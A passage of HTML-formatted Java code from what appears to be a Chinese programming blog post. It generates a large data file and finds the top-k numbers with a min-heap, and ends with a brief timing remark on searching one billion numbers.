class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-24\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-25\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">random</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-26\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-27\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-28\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-29\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-30\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-31\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-32\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">PrintWriter </span><span class=\"crayon-v\">pW</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PrintWriter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">f</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"UTF-8\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-33\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-34\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">contains</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-35\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-v\">pW</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Math</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">random</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxRandomNumer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-36\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-37\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-v\">pW</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">topK</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-38\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">pW</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">flush</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-39\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">FileNotFoundException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-40\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// TODO Auto-generated catch block</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-41\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-42\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">UnsupportedEncodingException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-43\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// TODO Auto-generated catch block</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-44\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-45\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-46\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-47\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-48\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">findTopK</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-49\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-50\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">//read</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-51\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">File</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"data.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-52\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-53\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">Scanner </span><span class=\"crayon-v\">scanner</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Scanner</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">f</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-54\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-55\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">scanner</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nextInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-56\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-57\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">//core</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-58\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">scanner</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hasNextInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-59\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">scanner</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nextInt</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-60\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-61\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-62\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-63\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">a</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-64\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-65\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-66\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-67\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Arrays</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-68\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">FileNotFoundException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-69\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// TODO Auto-generated catch block</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-70\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-71\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-72\"><span class=\"crayon-h\">\t\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-73\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-74\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-75\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">//O(n), minimal heap</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-76\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-77\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-78\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-79\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-80\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-81\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-82\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-83\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-84\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-85\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-86\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-87\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-r\">child</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-88\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-89\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-90\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-91\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-92\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-93\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a7b9270327051-94\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a7b9270327051-95\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0181 seconds] -->\r\n<p></p>\n<hr>\n<p>ps:大致测试了一下，10亿个数中找到top5需要140秒左右，应该是很快了。</p>\n<h2 id=\"5-总结\">5 